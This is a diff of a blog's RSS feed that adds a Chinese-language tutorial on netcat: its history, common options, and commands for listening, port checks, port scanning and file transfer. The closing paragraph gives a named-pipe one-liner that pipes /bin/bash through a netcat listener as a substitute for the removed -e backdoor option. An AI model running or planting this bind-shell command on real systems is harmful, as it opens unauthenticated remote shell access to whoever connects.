@@ -1,1 +1,39 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>netcat on sherry's blog</title><link>https://ireflux.github.io/snow/tags/netcat/</link><description>Recent content in netcat on sherry's blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 16 Mar 2020 00:00:00 +0000</lastBuildDate><atom:link href="https://ireflux.github.io/snow/tags/netcat/index.xml" rel="self" type="application/rss+xml"/><item><title>netcat 的使用笔记</title><link>https://ireflux.github.io/snow/post/netcat-note/</link><pubDate>Mon, 16 Mar 2020 00:00:00 +0000</pubDate><guid>https://ireflux.github.io/snow/post/netcat-note/</guid><description>&lt;p>当在&lt;a href="https://packages.debian.org/sid/netcat-openbsd"> debian 的仓库&lt;/a>中查看 openbsd 版本的 netcat时，会看到描述中有这样一句话：“TCP/IP swiss army knife”，被誉为 TCP/IP 的瑞士军刀，可以想象，这可以说是很高的赞誉了。netcat 当年还是2001年，2003年，2006年的 insecure.org 几次安全工具的投票中的前五名，它不仅是一个非常优秀的软件，体积还很小（只有几十KB），&lt;a href="https://github.com/openbsd/src/tree/master/usr.bin/nc">源代码&lt;/a> 也很少，以至于有很多人去重写，出现了很多变种。比较知名的有&lt;a href="https://packages.debian.org/sid/netcat-openbsd">openbsd版本&lt;/a>，&lt;a href="http://netcat.sourceforge.net/download.php">gnu版本&lt;/a>，&lt;a href="https://nmap.org/ncat/">nmap社区版本ncat&lt;/a>。&lt;/p></description></item></channel></rss>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>netcat on sherry's blog</title><link>https://ireflux.github.io/snow/tags/netcat/</link><description>Recent content in netcat on sherry's blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Mon, 16 Mar 2020 00:00:00 +0000</lastBuildDate><atom:link href="https://ireflux.github.io/snow/tags/netcat/index.xml" rel="self" type="application/rss+xml"/><item><title>netcat 的使用笔记</title><link>https://ireflux.github.io/snow/post/netcat-note/</link><pubDate>Mon, 16 Mar 2020 00:00:00 +0000</pubDate><guid>https://ireflux.github.io/snow/post/netcat-note/</guid><description>&lt;p>当在&lt;a class="link" href="https://packages.debian.org/sid/netcat-openbsd" target="_blank" rel="noopener"
+> debian 的仓库&lt;/a>中查看 openbsd 版本的 netcat时，会看到描述中有这样一句话：“TCP/IP swiss army knife”，被誉为 TCP/IP 的瑞士军刀，可以想象，这可以说是很高的赞誉了。netcat 当年还是2001年，2003年，2006年的 insecure.org 几次安全工具的投票中的前五名，它不仅是一个非常优秀的软件，体积还很小（只有几十KB），&lt;a class="link" href="https://github.com/openbsd/src/tree/master/usr.bin/nc" target="_blank" rel="noopener"
+>源代码&lt;/a> 也很少，以至于有很多人去重写，出现了很多变种。比较知名的有&lt;a class="link" href="https://packages.debian.org/sid/netcat-openbsd" target="_blank" rel="noopener"
+>openbsd版本&lt;/a>，&lt;a class="link" href="http://netcat.sourceforge.net/download.php" target="_blank" rel="noopener"
+>gnu版本&lt;/a>，&lt;a class="link" href="https://nmap.org/ncat/" target="_blank" rel="noopener"
+>nmap社区版本ncat&lt;/a>。&lt;/p>
+&lt;p>netcat 最初的作者是一个名为“&lt;em>Hobbit&lt;/em>”的人在1995年10月28号以源代码的形式发布的。在其&lt;a class="link" href="https://nc110.sourceforge.io/" target="_blank" rel="noopener"
+>官网&lt;/a>还能找到一些其他信息以及由“&lt;em>Hobbit&lt;/em>”最后更新于2007年的那个版本。在本文中，我使用的是 openbsd-netcat，因此以下使用记录如无特殊说明默认都是 openbsd 版本的netcat。&lt;/p>
+&lt;p>首先来看一下 &lt;code>nc -h&lt;/code> 里平时使用频率比较高的一些选项：&lt;/p>
+&lt;ul>
+&lt;li>h：输出帮助信息&lt;/li>
+&lt;li>k：可以使客户端重复连接，一般配合 l 来使用&lt;/li>
+&lt;li>l：开启监听模式，作为服务端。若不加该选项则默认为客户端&lt;/li>
+&lt;li>n：不对命令行中的host进行域名解析。简单来说就是host写为x.x.x.x时加上该选项，写为域名时不加&lt;/li>
+&lt;li>p：指定端口&lt;/li>
+&lt;li>v：输出详细信息&lt;/li>
+&lt;li>z：通常用于端口扫描，仅判断是否能够连接，不进行数据通讯&lt;/li>
+&lt;/ul>
+&lt;h3 id="开启服务">开启服务&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ nc -l -k -p &lt;span style="color:#f92672">[&lt;/span>port&lt;span style="color:#f92672">]&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>作为服务端，监听端口，开启服务。假设客户端通过 &lt;code>nc [ip] [port]&lt;/code> 连上服务端，当断开客户端，服务端也会停止，加上选项 k 可以使其保持开启状态。这个是挺常见的用法，使用频率挺高，例如在flink的官方教程就用到了这个。&lt;/p>
+&lt;h3 id="测试端口">测试端口&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ nc -nv &lt;span style="color:#f92672">[&lt;/span>ip&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">[&lt;/span>port&lt;span style="color:#f92672">]&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>例如某个远程主机上开启了某个端口，这样做可以测试端口是否能连上，若其中的 ip 的位置为域名，就不需要加 n 了。&lt;/p>
+&lt;h3 id="端口扫描">端口扫描&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ nc -znv &lt;span style="color:#f92672">[&lt;/span>ip&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">[&lt;/span>port-port&lt;span style="color:#f92672">]&lt;/span> 2&amp;gt;&amp;amp;&lt;span style="color:#ae81ff">1&lt;/span> | grep succeeded
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以用来做渗透测试。&lt;/p>
+&lt;h3 id="文件传输">文件传输&lt;/h3>
+&lt;p>首先在接收端开启监听：&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ nc -l -p &lt;span style="color:#f92672">[&lt;/span>port&lt;span style="color:#f92672">]&lt;/span> &amp;gt; &lt;span style="color:#f92672">[&lt;/span>filename&lt;span style="color:#f92672">]&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后在发送端发送文件:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ nc &lt;span style="color:#f92672">[&lt;/span>ip&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">[&lt;/span>port&lt;span style="color:#f92672">]&lt;/span> &amp;lt; &lt;span style="color:#f92672">[&lt;/span>filename&lt;span style="color:#f92672">]&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这样传输文件的好处是不需要应用层，直接在传输层层面传输的，相比于通过应用层的软件之间的传输，性能上会有优势。假如从本机要传文件到开启了nat模式的虚拟机中，由于此时虚拟机对于宿主机的访问是单向的，因此可以先在虚拟机上配置一个端口转发，然后从本机 &lt;code>nc localhost [port] &amp;lt; [filename]&lt;/code> 。注：传输过程中没有进度条，因此需要重新开一个 terminal，自行对比文件的大小判断是否发送完后，然后在发送端 &lt;code>ctrl+c&lt;/code> 即可。&lt;/p>
+&lt;h2 id="后记">后记&lt;/h2>
+&lt;p>除了以上的常见操作外，netcat还能配合一些其他命令做到更多高端操作，诸如端口转发，代理转发，备份系统，开启后门等等，更多操作可以参考编程随想的博文——&lt;a class="link" href="https://program-think.blogspot.com/2019/09/Netcat-Tricks.html" target="_blank" rel="noopener"
+>扫盲 netcat（网猫）的 N 种用法——从“网络诊断”到“系统入侵”&lt;/a>。值得一提的是开启后门的选项 -e 在 openbsd-netcat 被删掉了，可能是作者觉得过于危险，但是在其他很多变种中这个选项还有保留。虽然 -e 在 openbsd-netcat 中被删除了，但是还是可以通过创建命名管道的方法间接达到 -e 的作用：&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ mkfifo &lt;span style="color:#f92672">[&lt;/span>name&lt;span style="color:#f92672">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ cat &lt;span style="color:#f92672">[&lt;/span>name&lt;span style="color:#f92672">]&lt;/span> | /bin/bash 2&amp;gt;&amp;amp;&lt;span style="color:#ae81ff">1&lt;/span> | nc -l -p &lt;span style="color:#f92672">[&lt;/span>port&lt;span style="color:#f92672">]&lt;/span> &amp;gt; &lt;span style="color:#f92672">[&lt;/span>name&lt;span style="color:#f92672">]&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这可能也是编程随想的博客中有提到但并未透露的“间接的方式”。&lt;/p></description></item></channel></rss>
